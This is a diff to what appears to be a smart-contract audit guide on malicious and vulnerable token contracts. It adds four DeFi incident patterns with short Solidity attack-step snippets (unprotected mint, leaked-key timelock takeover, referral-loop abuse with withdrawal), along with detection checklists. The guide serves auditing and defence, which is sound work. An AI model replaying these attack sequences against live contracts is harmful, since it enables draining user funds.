@@ -571,6 +571,136 @@ IUniswapV2Pair(pair).swap(amountOut, 0, mev, "");
 
 ---
 
+## Category 9: Unprotected Reward/Mint Functions (2021-2022)
+
+### Pattern 9.1: Public rewardHolders Mint (NovaExchange Pattern) [HIGH]
+
+**Real-World Example: NovaExchange - December 2022 - BSC**
+- PoC: `DeFiHackLabs/src/test/2022-12/NovaExchange_exp.sol`
+
+```solidity
+// ❌ MALICIOUS/VULNERABLE: rewardHolders() has NO access control
+// Anyone can call it to mint arbitrary amounts of NOVA tokens
+
+// @audit Public function mints tokens to caller — no onlyOwner modifier
+novaContract.rewardHolders(10_000_000_000_000_000_000_000_000_000);
+// Result: Attacker mints 10 billion NOVA tokens to themselves
+// Then dumps on DEX for profit (if liquidity exists)
+```
+
+**Detection Checklist:**
+- [ ] Check for `rewardHolders`, `distributeReward`, or similar public mint functions
+- [ ] Verify all minting functions have proper access control
+- [ ] Look for reward functions that accept arbitrary amounts
+
+### Pattern 9.2: Private Key Leak / Insider Rug (Levyathan Pattern) [CRITICAL]
+
+**Real-World Example: Levyathan - July 2021 - BSC**
+- PoC: `DeFiHackLabs/src/test/2021-07/Levyathan_exp.sol`
+
+```solidity
+// ❌ MALICIOUS: Developers leaked private keys on GitHub
+// Attacker used deployer key to schedule Timelock ownership transfer
+
+// Step 1: Using leaked deployer private key
+// @audit Private key was pushed to public GitHub repository
+Timelock.schedule(
+    MasterChef, 0,
+    abi.encodeWithSignature("transferOwnership(address)", attacker),
+    bytes32(0), salt, 172800  // 48-hour delay
+);
+
+// Step 2: Wait 48 hours for timelock...
+
+// Step 3: Execute ownership transfer
+Timelock.execute(
+    MasterChef, 0,
+    abi.encodeWithSignature("transferOwnership(address)", attacker),
+    bytes32(0), salt
+);
+
+// Step 4: Recover token ownership through MasterChef
+MasterChef.recoverLevOwnership();
+
+// Step 5: Mint unlimited tokens
+// @audit 100 octillion LEV minted — users unable to withdraw staked funds
+LEV.mint(attacker, 100_000_000_000_000_000_000_000_000);
+
+// Impact: All users' leaveStaking() and withdraw() calls revert
+// Their staked funds are permanently locked
+```
+
+**Detection Checklist:**
+- [ ] Verify deployer keys are not in any public repository
+- [ ] Check if MasterChef or staking contracts have `recoverOwnership` functions
+- [ ] Look for Timelock-gated ownership transfers that could be triggered by key compromise
+- [ ] Verify that unlimited mint capability doesn't exist after ownership transfer
+
+### Pattern 9.3: Compromised Key / Insider Mint (PAID Network Pattern) [CRITICAL]
+
+**Real-World Example: PAID Network - March 2021 - ~$3M realized (159M tokens minted) - Ethereum**
+- PoC: `DeFiHackLabs/src/test/2021-03/PAID_exp.sol`
+
+```solidity
+// ❌ MALICIOUS/COMPROMISED: Owner key used to mint unlimited tokens
+// Either private key compromise or insider rug — never conclusively determined
+
+// @audit Compromised deployer wallet calls mint()
+cheats.prank(0x18738290AF1Aaf96f0AcfA945C9C31aB21cd65bE);
+PAID.mint(address(this), 59_471_745_571_000_000_000_000_000);
+// Result: 59.47M PAID tokens minted (worth ~$160M at market price)
+// Attacker dumped on Uniswap for ~$3M ETH before price collapsed
+
+// Impact:
+// - PAID token price dropped 80%+ in minutes
+// - $160M in market cap evaporated
+// - Only ~$3M realized due to liquidity limitations
+```
+
+**Detection Checklist:**
+- [ ] Check if `mint()` function exists and who can call it
+- [ ] Verify minting keys are managed via multisig (not single EOA)
+- [ ] Look for capped supply or minting rate limits
+- [ ] Verify that post-deployment minting capability is intentional
+
+### Pattern 9.4: Game Economics Referral Abuse (SheepFarm Pattern) [HIGH]
+
+**Real-World Example: SheepFarm - November 2022 - BSC**
+- PoC: `DeFiHackLabs/src/test/2022-11/SheepFarm_exp.sol` and `SheepFarm2_exp.sol`
+
+```solidity
+// ❌ VULNERABLE: register() can be called unlimited times
+// Each call accumulates referral bonus gems that convert to withdrawable BNB
+
+// Step 1: Register 402 times — each gives referral gems
+// @audit No limit on registrations per address
+for (uint256 i; i < 402; ++i) {
+    Farm.register(neighbor);  // Referral bonus gems each time
+}
+
+// Step 2: Tiny real deposit
+Farm.addGems{value: 5e14}();  // 0.0005 BNB
+
+// Step 3: Upgrade villages with inflated gems (free resources)
+for (uint256 i; i < 5; ++i) {
+    Farm.upgradeVillage(i);  // @audit Gems from referral abuse cover cost
+}
+
+// Step 4: Sell upgraded village + withdraw inflated BNB
+Farm.sellVillage();
+Farm.withdrawMoney(156_000);  // @audit Withdraw real BNB from game contract
+selfdestruct(payable(msg.sender));
+// Profit: BNB extracted far exceeding the 0.0005 BNB deposit
+```
+
+**Detection Checklist:**
+- [ ] Check if `register()` or referral functions can be called multiple times
+- [ ] Verify per-address registration limits exist
+- [ ] Look for in-game currency → real token conversion paths
+- [ ] Ensure virtual rewards cannot exceed real deposits
+
+---
+
 ## Impact Analysis
 
 ### Technical Impact
@@ -822,7 +952,7 @@ rg "emergency|withdraw|drain|sweep" --type sol
 
 ## Keywords for Search
 
-`rug pull`, `honeypot`, `malicious contract`, `backdoor`, `hidden mint`, `transfer restriction`, `sell block`, `magic number`, `trojan proxy`, `selfdestruct`, `drain liquidity`, `pair manipulation`, `fee extraction`, `owner privilege`, `cumulative limit`, `trading disabled`, `blacklist`, `unverified contract`, `time bomb`, `delayed activation`, `proxy hijack`, `masterCopy`, `delegatecall exploit`, `social engineering`, `multisig attack`, `tax wallet`, `emergency withdraw`, `sweep function`, `secret admin`
+`rug pull`, `honeypot`, `malicious contract`, `backdoor`, `hidden mint`, `transfer restriction`, `sell block`, `magic number`, `trojan proxy`, `selfdestruct`, `drain liquidity`, `pair manipulation`, `fee extraction`, `owner privilege`, `cumulative limit`, `trading disabled`, `blacklist`, `unverified contract`, `time bomb`, `delayed activation`, `proxy hijack`, `masterCopy`, `delegatecall exploit`, `social engineering`, `multisig attack`, `tax wallet`, `emergency withdraw`, `sweep function`, `secret admin`, `Levyathan`, `PAID Network`, `NovaExchange`, `SheepFarm`, `referral abuse`, `key compromise`, `private key leak`, `rewardHolders`, `game economics`
 
 ---
 
@@ -857,7 +987,7 @@ rg "emergency|withdraw|drain|sweep" --type sol
 | IRYSAI | 2025-05-20 | $70K | rug pull | bsc |
 | VRug | 2024-11-07 | $8K | Rug pull | ethereum |
 | YziAI | 2025-03-27 | $376 | Rug Pull | bsc |
-| NOVAToken | 2022-12-09 | $330 | Malicious Unlimted Minting (Rugged) | bsc |
+| **NOVAToken** | Dec 2022 | $330 | Malicious Unlimted Minting (Rugged) | bsc |\n| **Levyathan** | Jul 2021 | LEV inflated | Private Key Leak → Unlimited Mint | bsc |\n| **PAID Network** | Mar 2021 | ~$3M | Key Compromise → Mint 59M tokens | ethereum |\n| **SheepFarm** | Nov 2022 | BNB profit | Referral Abuse → Gem Inflation | bsc |
 
 ### Top PoC References
 
@@ -866,4 +996,4 @@ rg "emergency|withdraw|drain|sweep" --type sol
 - **IRYSAI** (2025-05, $70K): `DeFiHackLabs/src/test/2025-05/IRYSAI_exp.sol`
 - **VRug** (2024-11, $8K): `DeFiHackLabs/src/test/2024-11/VRug_exp.sol`
 - **YziAI** (2025-03, $376): `DeFiHackLabs/src/test/2025-03/YziAIToken_exp.sol`
-- **NOVAToken** (2022-12, $330): `DeFiHackLabs/src/test/2022-12/NovaExchange_exp.sol`
+- **NOVAToken** (2022-12, $330): `DeFiHackLabs/src/test/2022-12/NovaExchange_exp.sol`\n- **Levyathan** (2021-07, LEV inflated): `DeFiHackLabs/src/test/2021-07/Levyathan_exp.sol`\n- **PAID Network** (2021-03, ~$3M): `DeFiHackLabs/src/test/2021-03/PAID_exp.sol`\n- **SheepFarm** (2022-11, BNB profit): `DeFiHackLabs/src/test/2022-11/SheepFarm_exp.sol`
